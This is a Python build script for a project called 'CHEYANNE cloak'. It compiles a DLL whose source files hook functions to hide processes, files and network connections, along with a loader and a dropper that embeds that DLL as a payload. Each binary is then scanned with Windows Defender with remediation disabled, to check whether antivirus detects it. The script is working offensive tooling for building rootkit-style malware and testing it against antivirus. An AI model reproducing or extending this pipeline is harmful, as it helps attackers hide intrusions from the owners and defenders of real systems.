"""
build_cloak.py — CHEYANNE Concealment Build Script
22DIV / george wu

Compiles cloak.dll and cloak_loader.exe using MSVC (cl.exe).
Runs Defender scan on both binaries.

Usage:
    python cloak/build_cloak.py
    python cloak/build_cloak.py --scan    (build + Defender scan)
"""

import subprocess
import sys
import os
import glob

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
OUT_DIR = os.path.join(SCRIPT_DIR, "bin")

try:
    import sys; sys.path.insert(0, os.path.dirname(SCRIPT_DIR))
    from cheyanne_config import VCVARS
except ImportError:
    VCVARS = r"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"

DLL_SOURCES = [
    "hook_engine.c",
    "hide_process.c",
    "hide_file.c",
    "hide_connection.c",
    "cloak.c",
]

LOADER_SOURCE = "cloak_loader.c"
DROPPER_SOURCE = "vader_dropper.c"  # filename unchanged


def find_mpcmdrun():
    base = r"C:\ProgramData\Microsoft\Windows Defender\Platform"
    if not os.path.isdir(base):
        return None
    versions = sorted(os.listdir(base), reverse=True)
    for v in versions:
        path = os.path.join(base, v, "MpCmdRun.exe")
        if os.path.isfile(path):
            return path
    return None


def run_cmd(cmd, desc):
    print(f"\n  [*] {desc}")
    print(f"      {cmd[:120]}...")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"  [!] FAILED (exit {result.returncode})")
        if result.stderr:
            for line in result.stderr.strip().split('\n')[:10]:
                print(f"      {line}")
        if result.stdout:
            for line in result.stdout.strip().split('\n')[:10]:
                print(f"      {line}")
        return False
    print(f"  [+] OK")
    return True


def build():
    os.makedirs(OUT_DIR, exist_ok=True)

    src_files = " ".join(os.path.join(SCRIPT_DIR, s) for s in DLL_SOURCES)
    dll_out = os.path.join(OUT_DIR, "cloak.dll")
    def_file = os.path.join(SCRIPT_DIR, "cloak.def")

    dll_cmd = (
        f'cmd /c ""{VCVARS}" >nul 2>&1 && '
        f'cl.exe /nologo /O2 /W3 /LD '
        f'{src_files} '
        f'/Fe:"{dll_out}" '
        f'/link /DEF:"{def_file}" '
        f'iphlpapi.lib ws2_32.lib kernel32.lib ntdll.lib user32.lib"'
    )

    loader_src = os.path.join(SCRIPT_DIR, LOADER_SOURCE)
    loader_out = os.path.join(OUT_DIR, "cloak_loader.exe")

    loader_cmd = (
        f'cmd /c ""{VCVARS}" >nul 2>&1 && '
        f'cl.exe /nologo /O2 /W3 '
        f'"{loader_src}" '
        f'/Fe:"{loader_out}" '
        f'/link kernel32.lib user32.lib"'
    )

    dropper_src = os.path.join(SCRIPT_DIR, DROPPER_SOURCE)
    dropper_out = os.path.join(OUT_DIR, "cheyanne_dropper.exe")
    payload_h = os.path.join(SCRIPT_DIR, "cloak_payload.h")

    dropper_cmd = (
        f'cmd /c ""{VCVARS}" >nul 2>&1 && '
        f'cl.exe /nologo /O2 /W3 '
        f'/I"{SCRIPT_DIR}" '
        f'"{dropper_src}" '
        f'/Fe:"{dropper_out}" '
        f'/link /SUBSYSTEM:WINDOWS ws2_32.lib kernel32.lib ntdll.lib user32.lib advapi32.lib gdi32.lib"'
    )

    print("\n  CHEYANNE CLOAK — Build")
    print("  ===================\n")

    ok = True
    if not run_cmd(dll_cmd, "Compiling cloak.dll"):
        ok = False
    if not run_cmd(loader_cmd, "Compiling cloak_loader.exe"):
        ok = False

    if os.path.exists(dll_out) and os.path.exists(payload_h):
        dll_mtime = os.path.getmtime(dll_out)
        hdr_mtime = os.path.getmtime(payload_h)
        if dll_mtime > hdr_mtime:
            print("\n  [*] Regenerating cloak_payload.h (DLL newer than header)")
            gen_script = os.path.join(SCRIPT_DIR, "gen_payload.py")
            subprocess.run([sys.executable, gen_script], cwd=SCRIPT_DIR)
    elif os.path.exists(dll_out) and not os.path.exists(payload_h):
        print("\n  [*] Generating cloak_payload.h")
        gen_script = os.path.join(SCRIPT_DIR, "gen_payload.py")
        subprocess.run([sys.executable, gen_script], cwd=SCRIPT_DIR)

    if os.path.exists(payload_h):
        if not run_cmd(dropper_cmd, "Compiling cheyanne_dropper.exe"):
            ok = False
    else:
        print("  [!] cloak_payload.h missing — skipping dropper build")

    for junk in glob.glob(os.path.join(SCRIPT_DIR, "*.obj")):
        os.remove(junk)
    for junk in glob.glob(os.path.join(OUT_DIR, "*.obj")):
        os.remove(junk)
    for junk in glob.glob(os.path.join(OUT_DIR, "*.exp")):
        os.remove(junk)
    for junk in glob.glob(os.path.join(OUT_DIR, "*.lib")):
        os.remove(junk)

    if ok:
        dll_size = os.path.getsize(dll_out) if os.path.exists(dll_out) else 0
        ldr_size = os.path.getsize(loader_out) if os.path.exists(loader_out) else 0
        drp_size = os.path.getsize(dropper_out) if os.path.exists(dropper_out) else 0
        print(f"\n  [+] cloak.dll:           {dll_size // 1024} KB")
        print(f"  [+] cloak_loader.exe:    {ldr_size // 1024} KB")
        print(f"  [+] cheyanne_dropper.exe: {drp_size // 1024} KB")

    return ok


def scan():
    mp = find_mpcmdrun()
    if not mp:
        print("  [!] MpCmdRun.exe not found — skipping scan")
        return

    print(f"\n  [*] Defender scan ({os.path.basename(os.path.dirname(mp))})")

    for binary in ["cloak.dll", "cloak_loader.exe", "cheyanne_dropper.exe"]:
        path = os.path.join(OUT_DIR, binary)
        if not os.path.exists(path):
            print(f"  [!] {binary} not found — skipping")
            continue

        cmd = f'"{mp}" -Scan -ScanType 3 -File "{path}" -DisableRemediation'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr

        if "found no threats" in output.lower() or result.returncode == 0:
            print(f"  [+] {binary}: CLEAN")
        else:
            print(f"  [!] {binary}: DETECTED")
            for line in output.strip().split('\n')[:5]:
                print(f"      {line}")


def main():
    ok = build()
    if not ok:
        print("\n  [!] Build failed")
        sys.exit(1)

    if "--scan" in sys.argv or len(sys.argv) == 1:
        scan()

    print("\n  [*] Build complete\n")


if __name__ == "__main__":
    main()
